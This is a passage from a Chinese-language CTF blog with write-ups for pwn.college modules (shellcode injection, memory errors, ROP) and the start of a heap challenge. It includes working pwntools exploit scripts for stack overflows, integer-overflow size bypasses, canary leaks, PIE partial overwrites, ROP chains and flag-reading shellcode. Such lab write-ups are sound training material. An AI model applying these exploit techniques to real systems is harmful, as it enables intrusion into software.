</code>的内容为给的密码。</p>\n<h4 id=\"Level6\">Level6<a class=\"post-anchor\" href=\"#Level6\"></a></h4><p>​        一个输出重定向，创建对应文件<code>./embryoio_level6 &gt; /tmp/ptyaid </code>，flag在<code>ptyaid</code>中。</p>\n<h4 id=\"Level7\">Level7<a class=\"post-anchor\" href=\"#Level7\"></a></h4><p><code>env -i ./xxx</code></p>\n<h4 id=\"Level8\">Level8<a class=\"post-anchor\" href=\"#Level8\"></a></h4><p>​        写个sh脚本，内容是打开这个题目。注意路径。</p>\n<pre><code class=\"bash\">hacker@embryoio_level8:~$ cat my_script.sh \n/challenge/embryoio_level8\n</code></pre>\n<h4 id=\"Level9\">Level9<a class=\"post-anchor\" href=\"#Level9\"></a></h4><p>​        与level8同理，顺手输个密码就行。</p>\n<h4 id=\"Level10\">Level10<a class=\"post-anchor\" href=\"#Level10\"></a></h4><p>​        同level3</p>\n<h4 id=\"Level11\">Level11<a class=\"post-anchor\" href=\"#Level11\"></a></h4><p>​        同level4。</p>\n<h4 id=\"Level12\">Level12<a class=\"post-anchor\" href=\"#Level12\"></a></h4><p>​        同level5</p>\n<h4 id=\"Level13\">Level13<a class=\"post-anchor\" href=\"#Level13\"></a></h4><p>​        同level6</p>\n<h4 id=\"Level14\">Level14<a class=\"post-anchor\" href=\"#Level14\"></a></h4><p>​        同level7</p>\n<h4 id=\"Level15\">Level15<a class=\"post-anchor\" href=\"#Level15\"></a></h4><p>​        一言难尽，可以在ipython里用pwntools。</p>\n<h4 id=\"Level16\">Level16<a class=\"post-anchor\" href=\"#Level16\"></a></h4><p>​        同15。</p>\n<h4 id=\"Level17\">Level17<a class=\"post-anchor\" href=\"#Level17\"></a></h4><p>​        这几个level就是将python与之前level的命令行参数或者环境变量结合，虽然难度不高但是很考验pwntools运用的熟练度。所以我还没有找到做出来的方法。</p>\n<h4 id=\"Level18\">Level18<a class=\"post-anchor\" href=\"#Level18\"></a></h4><p>​        利用python设置环境变量，主要利用到<code>os.environ</code>或者<code>os.putenv</code>函数。</p>\n<h4 id=\"Level19\">Level19<a class=\"post-anchor\" href=\"#Level19\"></a></h4><p>​        </p>\n</body></html>","tags":["pwncollege"]},{"title":"Shellcode_Injection","url":"/2022/01/29/Shellcode_Injection/","content":"<html><head></head><body><p>​        整个专题其实就是一个shellcode编写的小练习，并不需要自己寻找漏洞点，写好shellcode直接注入就行。</p>\n<p>​        如果要将服务器的文件传输到本地的话可以使用:</p>\n<pre><code class=\"bash\"> scp -i key -r hacker@dojo.pwn.college:/challenge [本地路径]\n</code></pre>\n<h4 id=\"Level1\">Level1<a class=\"post-anchor\" href=\"#Level1\"></a></h4><p>​        可以用pwntools的shellcraft模块，但是也可以手写shellcode。</p>\n<p>​        这道题可以用简单的orw的思路做。但是shellcode的地址需要在规定的地方。</p>\n<pre><code class=\"python\">shellcode = shellcraft.amd64.open(\"/flag\")        \nshellcode += shellcraft.amd64.read('rax', stack + 0x100, 0x100)\nshellcode += shellcraft.amd64.write(1, stack + 0x100, 0x100)\n</code></pre>\n<h4 id=\"Level2\">Level2<a class=\"post-anchor\" href=\"#Level2\"></a></h4><pre><code class=\"python\">shellcode = shellcraft.amd64.nop()*0x800\nshellcode = shellcraft.amd64.open(\"/flag\")        \nshellcode += shellcraft.amd64.read('rax', stack + 0x100, 0x100)\nshellcode += shellcraft.amd64.write(1, stack + 0x100, 0x100)\n</code></pre>\n<h4 id=\"Level3\">Level3<a class=\"post-anchor\" href=\"#Level3\"></a></h4><p>​        换个地址就行</p>\n<h4 id=\"Level4\">Level4<a class=\"post-anchor\" href=\"#Level4\"></a></h4><p>​        shellcode不能含有”H”。</p>\n<p>​        第一个想到的就是不能含有<code>push</code>，其他指令似乎也没有h了。想要完成的话第一个思路是手写不含push的shellcode，另外一个思路是构造跳板读取其他位置的shellcode（这种思路其实比较常见并且配套的视频中也提到过）</p>\n<p>​        但是实际做题体验极差，写了read()后，读取的shellcode无论怎样都无法读到flag，明明已经getshell了，也没有eof，但是就是没办法。以后再想吧。</p>\n<h4 id=\"Level5\">Level5<a class=\"post-anchor\" href=\"#Level5\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-18%20%E4%B8%8B%E5%8D%8810.02.44.png\" data-caption=\"截屏2022-02-18 下午10.02.44\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-02-18%20%E4%B8%8B%E5%8D%8810.02.44.png\" alt=\"截屏2022-02-18 下午10.02.44\"></a></p>\n<p>​        需要让shellcode在运行时生成<code>syscall()</code>。</p>\n<p>一个比较自然的想法就是把对应的机器码储存在寄存器中，然后拿出来用。</p>\n<p><code>int 0x80</code>对应的机器码<code>CD 80 </code></p>\n</body></html>","tags":["pwncollege"]},{"title":"MemoryErrors","url":"/2022/03/03/MemoryErrors/","content":"<html><head></head><body><p>​        视频主要介绍了栈溢出及其保护。保护的绕过包括canary和pie，并没有提到NX（那个似乎在后面一个module）</p>\n<p>​        传输题目到本地可以使用<code>scp</code>命令。</p>\n<pre><code class=\"bash\">scp -i key -r hacker@dojo.pwn.college:/challenge/babymem_level4.1 /Users/rin/ctf/pwn/pwn_college/MemoryErrors\n</code></pre>\n<h4 id=\"Level1-0\">Level1.0<a class=\"post-anchor\" href=\"#Level1-0\"></a></h4><p>​        随便溢，覆盖掉变量就行。</p>\n<h4 id=\"Level1-1\">Level1.1<a class=\"post-anchor\" href=\"#Level1-1\"></a></h4><p>​        随便溢。</p>\n<h4 id=\"Level2-0\">Level2..0<a class=\"post-anchor\" href=\"#Level2-0\"></a></h4><p>​        随便溢。</p>\n<h4 id=\"level2-1\">level2.1<a class=\"post-anchor\" href=\"#level2-1\"></a></h4><p>​        这道题理论上也是需要溢出到v9，但是很奇怪。多试几次会发现溢出得足够大的时候就会有flag了，这里溢出0x1000个就行。</p>\n<p>​        关于为什么要溢出那么多：我找了很久也没有找到第二次输入的时候缓冲区的地址，大概是利用到了堆内存。</p>\n<h4 id=\"Level3-0\">Level3.0<a class=\"post-anchor\" href=\"#Level3-0\"></a></h4><p>​        没啥好说的。</p>\n<pre><code class=\"python\">from pwn import*\n\np = process(\"/challenge/babymem_level3.0\")\n\nwin_addr = 0x4019fa\npayload = \"a\"*152 + p64(win_addr)\n\np.recvuntil(\"Payload size:\")\np.sendline(\"160\")\np.recvuntil(\"!\")\np.sendline(payload)\np.recv()\n\np.interactive()\n</code></pre>\n<p>​        </p>\n<h4 id=\"Level3-1\">Level3.1<a class=\"post-anchor\" href=\"#Level3-1\"></a></h4><pre><code class=\"python\">from pwn import*\n\n#context.terminal = ['tmux','splitw','-h']\ncontext.log_level = \"debug\"\n#p = process(\"./babymem_level3.1\")\np = process(\"/challenge/babymem_level3.1\")\n\n\nwin_addr = 0x401D35\npayload = b\"a\"*105 + p64(win_addr)\n\n\np.send(b\"115\")\n#gdb.attach(p)\n\np.send(payload)\n\np.interactive()\n</code></pre>\n<p>​            </p>\n<p>为什么偏移量这么难找。</p>\n<h4 id=\"Level4-0\">Level4.0<a class=\"post-anchor\" href=\"#Level4-0\"></a></h4><p>​        这个题也是蛮灵性的，只能最多输入18个字符但是溢出量是40。</p>\n<p>​        注意到实际上程序对于第一次输入的size是没有很严格检测的，所以我们可以输入任意小于18的数字，比如负数。并且负责控制输入size的实际上是一个无符号整数。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8A%E5%8D%8810.16.03.png\" data-caption=\"截屏2022-03-05 上午10.16.03\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-05%20%E4%B8%8A%E5%8D%8810.16.03.png\" alt=\"截屏2022-03-05 上午10.16.03\"></a></p>\n<p>对于int型的负数强制类型转换，使得实际能输入的size变得非常大。所以这里其实相当于构建了一个整数溢出，然后绕过了size后面就比较常规了。</p>\n<pre><code class=\"python\">from pwn import*\n\n#context.terminal = ['tmux','splitw','-h']\n#context.log_level = \"debug\"\n#p = process(\"./babymem_level4.0\")\np = process(\"/challenge/babymem_level4.0\")\n\n#pad = 0x401B5 #0x30\nwin_addr = 0x401B88\npayload = b\"a\"*40+ p64(win_addr)\n\np.sendline(b\"-999\")\n#gdb.attach(p)\np.send(payload)\n\np.interactive()\n</code></pre>\n<p>​        </p>\n<h4 id=\"Level4-1\">Level4.1<a class=\"post-anchor\" href=\"#Level4-1\"></a></h4><p>​        漏洞点：</p>\n<pre><code class=\"c\">if ( (signed int)v5 &gt; 30 )\n</code></pre>\n<p>​        依然是利用强制类型转换将本来是uint的v5变成int来与30比较，形成整数溢出。</p>\n<pre><code class=\"python\">from pwn import*\n\n#context.terminal = ['tmux','splitw','-h']\n#context.log_level = \"debug\"\n#p = process(\"./babymem_level4.1\")\np = process(\"/challenge/babymem_level4.1\")\n\n#pad = 0x401B5 #0x30\nwin_addr = 0x4016A3\npayload = b\"a\"*56+ p64(win_addr)\n\np.sendline(b\"-999\")\n#gdb.attach(p)\np.send(payload)\n\np.interactive()\n</code></pre>\n<h4 id=\"Level5-0\">Level5.0<a class=\"post-anchor\" href=\"#Level5-0\"></a></h4><p>​        这个题依然是在输入size的地方进行了一定的检测，这里是</p>\n<pre><code class=\"c\">if ( v31 * v32 &gt; 7 )\n    sub_401150(\"record_size * record_num &lt; (unsigned int) sizeof(input)\", \"&lt;stdin&gt;\", 143LL, \"challenge\");\n</code></pre>\n<p>​    </p>\n<p>​        然后虽然可以输入负数，但是如果随便输的话会导致溢出到下一个payload的read的buffer，导致输入不了，程序直接爆炸。真的非常逆天。        </p>\n<p>​        4294967297是1，</p>\n<p>​        18446744073709551617</p>\n<p>2147483649</p>\n<p>​        去找了一下官方的teaching，发现思路其实并不是uint与int之间的强制类型转换，而是uint32和uint64之间强制类型转换导致的溢出。除了最后的size计算时，将v33转化成uint64，其他的变量都是uint32，<a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.15.22.png\" data-caption=\"截屏2022-03-07 下午4.15.22\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-07%20%E4%B8%8B%E5%8D%884.15.22.png\" alt=\"截屏2022-03-07 下午4.15.22\"></a></p>\n<pre><code class=\"python\">from pwn import*\n\np = process(\"/challenge/babymem_level5.0\")\n\n\nwin = 0x4022E7\n#payload = b'a'*40+b\"\\x48\"+ b\"a\"*2\npayload =  b'a'*136 + p64(win)\n#80+8 canary:16\np.sendline(b\"2147483649\")\np.sendline(b\"2\")\n\np.send(payload)\n\np.interactive()\n\n</code></pre>\n<h4 id=\"Level5-1\">Level5.1<a class=\"post-anchor\" href=\"#Level5-1\"></a></h4><pre><code class=\"python\">from pwn import*\n\np = process(\"/challenge/babymem_level5.1\")\n\n\nwin = 0x40173B\n#payload = b'a'*40+b\"\\x48\"+ b\"a\"*2\npayload =  b'a'*88 + p64(win)\n#80+8 canary:16\np.sendline(b\"2147483649\")\np.sendline(b\"2\")\n\np.send(payload)\n\np.interactive()\n</code></pre>\n<h4 id=\"Level6-0\">Level6.0<a class=\"post-anchor\" href=\"#Level6-0\"></a></h4><p>​        利用gadget的思想，直接将地址填成flag，而绕过win的检测。</p>\n<pre><code class=\"python\">from pwn import*\n\n#context.terminal = ['tmux','splitw','-h']\n#context.log_level = \"debug\"\n\n#p = process(\"./babymem_level5.0\")\np = process(\"/challenge/babymem_level6.0\")\n#gdb.attach(p)\n#pad = 0x401B5 #0x30\nwin_addr = 0x401693\npayload = b\"a\"*152+ p64(win_addr)\n\n\np.sendline(\"160\")\np.recv()\np.send(payload)\n\np.interactive()\n</code></pre>\n<h4 id=\"Level6-1\">Level6.1<a class=\"post-anchor\" href=\"#Level6-1\"></a></h4><p>​        同理。</p>\n<pre><code class=\"python\">from pwn import*\n\ncontext.terminal = ['tmux','splitw','-h']\ncontext.log_level = \"debug\"\n\np = process(\"./babymem_level6.1\")\n#p = process(\"/challenge/babymem_level6.1\")\ngdb.attach(p)\n#pad = 0x401B5 #0x30\nwin_addr = 0x4013BA\npayload = b\"a\"*152+ p64(win_addr)\n\n\np.sendline(\"160\")\np.recv()\n\np.send(payload)\n\np.interactive()\n</code></pre>\n<h4 id=\"Level7-0\">Level7.0<a class=\"post-anchor\" href=\"#Level7-0\"></a></h4><p>​        开始考pie的绕过了，不走寻常路啊。</p>\n<p>​        之前讲到pie的绕过，一般是部分覆写，以及脚本爆破。</p>\n<p>​        地址的后三个字符永远一致，所以只需爆破第四位，就能将<code>retn</code>覆盖成<code>win</code>    。</p>\n<p>​        （话说如此我其实从来没有写过爆破pie的脚本。。。。所以说为什么不走寻常路，别的题一般都是五花八门的glibc或者漏洞点，然后用pie增加难度。没有pie做不出来，有pie更加做不出来了，然而这个题目就纯纯地考pie，真的牛）</p>\n<pre><code class=\"python\">from pwn import*\n\n#context.terminal = ['tmux','splitw','-h']\n#context.log_level = \"debug\"\n\n#p = process(\"./babymem_level7.0\")\np = process(\"/challenge/babymem_level7.0\")\n#gdb.attach(p)\n#pad = 0x401B5 #0x30\npayload = b\"a\"*136+ b\"\\xf4\\xbb\"\n\n\np.sendline(\"144\")\np.recv()\n\np.send(payload)\n\np.interactive()\n</code></pre>\n<p>多执行，总会爆出来的，不过爆之前先在本地调一调，不然有什么错的地方就冤大头了。</p>\n<h4 id=\"Level7-1\">Level7.1<a class=\"post-anchor\" href=\"#Level7-1\"></a></h4><pre><code class=\"python\">from pwn import*\n\n#context.terminal = ['tmux','splitw','-h']\n#context.log_level = \"debug\"\n\n#p = process(\"./babymem_level7.1\")\np = process(\"/challenge/babymem_level8.0\")\n\n#pad = 0x401B5 #0x30\npayload = b\"a\"*152+ b\"\\xa4\\xb0\"\n\n\np.sendline(\"160\")\np.recv()\n#gdb.attach(p)\np.send(payload)\n\np.interactive()\n</code></pre>\n<p>​                </p>\n<h4 id=\"Level8-0\">Level8.0<a class=\"post-anchor\" href=\"#Level8-0\"></a></h4><p>​        好像是又对输入size做了过滤。所以就用到另外一个trick，就是针对strlen的check可以用空字符绕过。</p>\n<pre><code class=\"python\">from pwn import*\n\n\n#context.terminal = ['tmux','splitw','-h']\n#context.log_level = \"debug\"\n\n#p = process(\"./babymem_level8.0\")\np = process(\"/challenge/babymem_level8.0\")\n\n\npayload = b'\\x00'*152 + b\"\\xa4\\xb0\"\np.sendline(\"160\")\np.recv()\n\np.send(payload)\n\n\np.interactive()\n</code></pre>\n<p>​        </p>\n<h4 id=\"Level8-1\">Level8.1<a class=\"post-anchor\" href=\"#Level8-1\"></a></h4><p>​        同理</p>\n<pre><code class=\"python\">from pwn import*\n\ncontext.terminal = ['tmux','splitw','-h']\ncontext.log_level = \"debug\"\n\np = process(\"./babymem_level8.1\")\n#p = process(\"/challenge/babymem_level8.1\")\n\npayload = b'\\x00'*104 + b\"\\x7e\\x79\"\np.sendline(\"112\")\np.recv()\ngdb.attach(p)\np.send(payload)\n\np.interactive()\n\n</code></pre>\n<h4 id=\"Level9-0\">Level9.0<a class=\"post-anchor\" href=\"#Level9-0\"></a></h4><p>​        以程序构造出的漏洞将输入写在canary后。这里需要写104个padding，同时72个padding加上<code>\\x60</code>直接绕到canary后覆写。</p>\n<pre><code class=\"python\">from pwn import*\n\np = process(\"/challenge/babymem_level9.1\")\n\npayload = b'a'*72+b\"\\x60\"+ b\"\\xbe\\xc5\"*6\n\np.sendline(\"106\")\np.recv()\n\np.send(payload)\np.interactive()\n\n</code></pre>\n<h4 id=\"Level9-1\">Level9.1<a class=\"post-anchor\" href=\"#Level9-1\"></a></h4><p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-06%20%E4%B8%8B%E5%8D%889.00.44.png\" data-caption=\"截屏2022-03-06 下午9.00.44\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-06%20%E4%B8%8B%E5%8D%889.00.44.png\" alt=\"截屏2022-03-06 下午9.00.44\"></a>        </p>\n<pre><code class=\"python\">from pwn import*\n\np = process(\"/challenge/babymem_level9.1\")\n\npayload = b'a'*40+b\"\\x47\"+ b\"\\x26\\x46\"\n\np.sendline(\"77\")\np.recv()\n\np.send(payload)\n\np.interactive()\n</code></pre>\n<p>​        n的数量和size都需要精准控制才能拿flag。</p>\n<h4 id=\"Level10-0\">Level10.0<a class=\"post-anchor\" href=\"#Level10-0\"></a></h4><p>​        其实虽然盯着伪代码盯了很久但是感觉并没有实际理解这道题。目前我的疑惑有二：</p>\n<ol>\n<li>为什么flag被load进了内存，并且也给出了它在栈中实际的地址，但是栈上对应的地址显示的是0.</li>\n<li>这道题的思路应该是通过后面那个you say来打印flag，但是如何将payload的指针覆盖为flag的指针？    </li>\n</ol>\n<p>​    </p>\n<p>​        解答一下，第一个问题其实很不应该，显示为0就是因为没有权限。然后第二个问题，覆盖payload指针的思路至少不应该在这个module出现，这道题的漏洞点就是payload的区域和flag的区域在栈上是连续的，只要覆盖掉截断payload的输出的空字符就可以一直输出栈上的内容，包括flag。</p>\n<p>​        ps，包括其他题也是，如果有疑惑其实可以找一下官方的teaching视频（但是也有很多没有就是了）</p>\n<p>​        </p>\n<pre><code class=\"python\">from pwn import*\n\n\np = process(\"/challenge/babymem_level10.0\")\n\npayload =  b'a'*111\n\np.sendline(b\"150\")\n\n\np.send(payload)\n</code></pre>\n<h4 id=\"Level10-1\">Level10.1<a class=\"post-anchor\" href=\"#Level10-1\"></a></h4><p>​        同</p>\n<pre><code class=\"python\">from pwn import*\n\np = process(\"/challenge/babymem_level10.1\")\n\npayload =  b'a'*79\n\np.sendline(b\"150\")\np.send(payload)\n\n\np.interactive()\n\n</code></pre>\n<h4 id=\"Level11-0\">Level11.0<a class=\"post-anchor\" href=\"#Level11-0\"></a></h4><p>​        也是类似的思路，但是这里倒不是栈地址了，不过区别不大，只是输入的payload大些。</p>\n<pre><code class=\"python\">from pwn import*\n\np = process(\"/challenge/babymem_level11.0\")\n#payload = b'a'*40+b\"\\x48\"+ b\"a\"*2\npayload =  b'a'*24577\n\np.sendline(b\"24600\")\np.send(payload)\n\np.interactive()\n</code></pre>\n<h4 id=\"level11-1\">level11.1<a class=\"post-anchor\" href=\"#level11-1\"></a></h4><p>​        同理</p>\n<p>​    （ps：size是我随便填的。但是也不能太随便，得先<code>vmmap</code>看看flag和input buffer被映射到了哪里）</p>\n<pre><code class=\"python\">from pwn import*\n\np = process(\"/challenge/babymem_level11.1\")\n\npayload =  b'a'*12289\n\np.sendline(b\"12400\")\np.send(payload)\n\np.interactive()\n\n</code></pre>\n<h4 id=\"level12-0\">level12.0<a class=\"post-anchor\" href=\"#level12-0\"></a></h4><p>​        这道题的trick就在于可以反复调用函数<code>challenge</code>，每一次调用虽然栈会被clear但是canary不变，从而泄露canary。思路其实比较简单，但是调试有些令人恼火。</p>\n<pre><code class=\"python\">from pwn import*\n\np = process(\"/challenge/babymem_level12.0\")\n\npayload1 =  b'a'*35+b\"REPEAT\"\n\np.sendline(b\"41\")\np.send(payload1)\np.recvuntil('You said:')\n\ncanary = u64(p.recv()[41:49])\ncanary  -= 0x54\n\npayload2 = b'a'*41 + p64(canary) + b'a'*8 + b\"\\x91\\xb0\"\np.send('100')\np.send(payload2)\n\np.interactive()\n</code></pre>\n<h4 id=\"Level12-1\">Level12.1<a class=\"post-anchor\" href=\"#Level12-1\"></a></h4><p>​    同理，但是需要好好调。 </p>\n<pre><code class=\"python\">from pwn import*\n\ncontext.terminal = ['tmux','splitw','-h']\ncontext.log_level = \"debug\"\n\np = process(\"./babymem_level12.1\")\n\npayload1 =  b'a'*83+b\"REPEAT\"\n\np.sendline(b\"89\")\ngdb.attach(p)\np.send(payload1)\np.recvuntil('You said:')\ncanary = u64(p.recv()[89:97])\n\ncanary  -= 0x54\nprint(hex(canary))\n\npayload2 = b'a'*89 + p64(canary) + b'a'*8 + b\"\\x63\\x18\"\n\np.send('112')\np.send(payload2)\npause()\n\np.interactive()\n</code></pre>\n<h4 id=\"level13-0\">level13.0<a class=\"post-anchor\" href=\"#level13-0\"></a></h4><p>​        。。输几个a就有flag，具体方法看13.1。</p>\n<h4 id=\"level13-1\">level13.1<a class=\"post-anchor\" href=\"#level13-1\"></a></h4><p>​        我觉得是最简单的level了。。</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.35.04.png\" data-caption=\"截屏2022-03-10 下午2.35.04\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-10%20%E4%B8%8B%E5%8D%882.35.04.png\" alt=\"截屏2022-03-10 下午2.35.04\"></a></p>\n<p>​        找到input buffer和flag间地址的填充量，填大于等于的a就行，数量没有必要精确。这个题脚本都没有写，实在太傻逼了。</p>\n<h4 id=\"level14\">level14<a class=\"post-anchor\" href=\"#level14\"></a></h4><p>​        其实我觉得这个题没有写的必要了，纯纯的就是13和12的结合。</p>\n<h4 id=\"level15-0\">level15.0<a class=\"post-anchor\" href=\"#level15-0\"></a></h4><p>​        一个奇怪的socket网络通信，我觉得思路是通过fork多个子进程来leak canary，但是由于从来没有接触过，所以先研究一会儿吧。</p>\n</body></html>","tags":["pwncollege"]},{"title":"ROP","url":"/2022/03/10/ROP/","content":"<html><head></head><body><p>写在前面：如果是普通的环境，运行程序可能需要<code>capstone</code>，可以直接在官网下载源码编译，然后将编译好的动态链接库cp到lib里</p>\n<p><code> cp libcapstone.so.5 /lib/x86_64-linux-gnu/</code></p>\n<h4 id=\"Level1\">Level1<a class=\"post-anchor\" href=\"#Level1\"></a></h4><p>​        最最最基础的rop了，和前前一个module的前面的有个level一模一样。</p>\n<pre><code class=\"python\">from pwn import*\n\n#context.terminal = ['tmux','splitw','-h']\n#context.log_level = \"debug\"\n\np = process(\"/challenge/babyrop_level1.0\")\nwin = 0x401b56\n\npayload = b\"a\"*104 + p64(win)\n\np.send(payload)\n\n\np.interactive()\n</code></pre>\n<h4 id=\"Level2\">Level2<a class=\"post-anchor\" href=\"#Level2\"></a></h4><pre><code class=\"python\">from pwn import*\n\n#context.terminal = ['tmux','splitw','-h']\n#context.log_level = \"debug\"\n\np = process(\"/challenge/babyrop_level2.0\")\nwin1 = 0x4022EE\nwin2 = 0x40239B\n\npayload = b\"a\"*88 + p64(win1) + p64(win2)\n\np.send(payload)\n\n\np.interactive()\n</code></pre>\n<h4 id=\"Level3\">Level3<a class=\"post-anchor\" href=\"#Level3\"></a></h4><p>​        从这个level差不多沾了一些rop的边了，需要利用<code>ROPgadget</code>来寻找对应的gadget</p>\n<p>​        </p>\n<pre><code class=\"python\">from pwn import*\n\n#context.terminal = ['tmux','splitw','-h']\n#context.log_level = \"debug\"\n\np = process(\"/challenge/babyrop_level3.0\")\nwin1 = 0x40275A\nwin2 = 0x402836\nwin3 = 0x402678\nwin4 = 0x402592\nwin5 = 0x402916\n\nrdi = 0x402d03\n\npayload = b\"a\"*72  \npayload += p64(rdi) + p64(1) + p64(win1)\npayload += p64(rdi) + p64(2) + p64(win2)\npayload += p64(rdi) + p64(3) + p64(win3)\npayload += p64(rdi) + p64(4) + p64(win4)\npayload += p64(rdi) + p64(5) + p64(win5)\n\np.send(payload)\n\n\np.interactive()\n</code></pre>\n<p>​    </p>\n<h4 id=\"Level4\">Level4<a class=\"post-anchor\" href=\"#Level4\"></a></h4><p>​        </p>\n<p>​        rop，ret2syscall。</p>\n<p>​        这道题其实方法有很多，但是由于栈的空间相对比较小，所以官方给出的做法反而是最聪明也是最实际的。</p>\n<p>（因为如果要orw或者getshell的话似乎还要栈迁移）</p>\n<pre><code class=\"python\">process.write(b'/flag\\0'.ljust(88,b'a') + pwn.p64(pop_rax.address)+pwn.p64(90) + pwn.p64(pop_rdi.address)+pwn.p64(input) \n    ...: + pwn.p64(pop_rsi.address) + pwn.p64(0o777) + pwn.p64(syscall.address))\n</code></pre>\n<p>我魔怔了</p>\n<p>顺便附一个拿input地址有问题的exp（其实我怀疑gadget的地址也有问题，但是懒得改了）</p>\n<pre><code class=\"python\">from pwn import*\n\ncontext.terminal = ['tmux','splitw','-h']\ncontext.log_level = \"debug\"\n\np = process(\"./babyrop_level4.0\")\nsyscall = 0x401a69\npop_rdi_ret = 0x401492\npop_rax_ret = 0x401a91\npop_rsi_ret = 0x401a71\n\np.recvuntil(\"[LEAK] Your input buffer is located at: \")\n\ninput  = u64(p.recv()[:12])\n\ngdb.attach(p)\nprint(input)\npayload = b\"/flag\\0\".ljust(88,b'a')  \npayload += p64(pop_rax_ret) + p64(90)\npayload += p64(pop_rdi_ret) + p64(input)\npayload += p64(pop_rsi_ret) + p64(0o777)\npayload += p64(syscall)\n\np.send(payload)\n\n\np.interactive()\n</code></pre>\n<h4 id=\"level5\">level5<a class=\"post-anchor\" href=\"#level5\"></a></h4><p>​        这个题也蛮魔怔，和上一个level没有什么区别，但是没有print input buffer，对于我来说也差不多，但是就相对更麻烦了。</p>\n<p>​        </p>\n</body></html>","tags":["pwncollege"]},{"title":"pwn中的python字符串处理问题","url":"/2022/03/12/pwn%E4%B8%AD%E7%9A%84python%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86%E9%97%AE%E9%A2%98/","content":"<html><head></head><body><p>​        最近在pwncollege做题的时候常常遇到接收的字符串处理不当的问题，故总结整理一下。</p>\n<h3 id=\"字符串截取\">字符串截取<a class=\"post-anchor\" href=\"#字符串截取\"></a></h3><pre><code class=\"python\">p.recv()[0:6]        #截取1-5个字符串\n\np.recv()[2:6]        #截取2-5个字符串\n\np.recv()[:]        #截取完整字符串\n\np.recv()[2:]#从第二个索引开始截取\n\np.recv()[-4:]#截取最后四个字符\n</code></pre>\n<p>​        </p>\n<h3 id=\"字符串处理\">字符串处理<a class=\"post-anchor\" href=\"#字符串处理\"></a></h3><p>​        一般来说我们接收到的数据是字符串的字节流，然后利用pwntools的unpack  module来转换为int型。并且</p>\n<p>​        所以一般来说这样的payload是不会出问题的。</p>\n<pre><code class=\"python\">canary = u64(p.recv()[41:49])\n</code></pre>\n<p>​        </p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-12%20%E4%B8%8A%E5%8D%8811.04.36.png\" data-caption=\"截屏2022-03-12 上午11.04.36\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-12%20%E4%B8%8A%E5%8D%8811.04.36.png\" alt=\"截屏2022-03-12 上午11.04.36\"></a></p>\n<p>​        所以当接收到类似以下的报错：</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-12%20%E4%B8%8A%E5%8D%8811.07.11.png\" data-caption=\"截屏2022-03-12 上午11.07.11\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-12%20%E4%B8%8A%E5%8D%8811.07.11.png\" alt=\"截屏2022-03-12 上午11.07.11\"></a></p>\n<p>​        </p>\n<p>​        很大概率并不是数据类型转换的问题，而是本身接收的数据存在问题，比如说接收的数据范围错了，或者根本就没有有效的数据。这个时候关注的重点应该是payload的逻辑本身而不是语法问题。</p>\n<p>​        </p>\n</body></html>","tags":["mess"]},{"title":"wustctf2020_easyfast","url":"/2022/03/15/week3-1.1/","content":"<html><head></head><body><p>2022-3-15</p>\n<h4 id=\"wustctf2020-easyfast\">wustctf2020_easyfast<a class=\"post-anchor\" href=\"#wustctf2020-easyfast\"></a></h4><p>checksec :</p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.39.36.png\" data-caption=\"截屏2022-03-15 下午3.39.36\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.39.36.png\" alt=\"截屏2022-03-15 下午3.39.36\"></a></p>\n<p><a href=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.47.23.png\" data-caption=\"截屏2022-03-15 下午3.47.23\" data-fancybox=\"images\"><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-15%20%E4%B8%8B%E5%8D%883.47.23.png\" alt=\"截屏2022-03-15 下午3.47.23\"></a></p>\n<p>​        简单逆向一下，有后门函数，当这个地址上储存的数小于等于0时getshell。整体的程序的话是一个没什么特别的菜单，free处有uaf，edit处能对堆指针任意写。</p>\n<p>​        首先逆向以后大体的思路是利用这个UAF进行<code>0x602090</code>的地址处的覆盖。</p>\n<p>​        所以我们需要构造chunk pointer为0x602080的fake chunk，使得对应的用户空间可以被写为0。这里就可以用到edit的任意写功能，将某个chunk的fd覆盖为0x602080，使得下一次申请到该地址的chunk。</p>\n<p>​        首先add再free两个chunk。</p>\n<p>稍微有一个要注意的就是<a 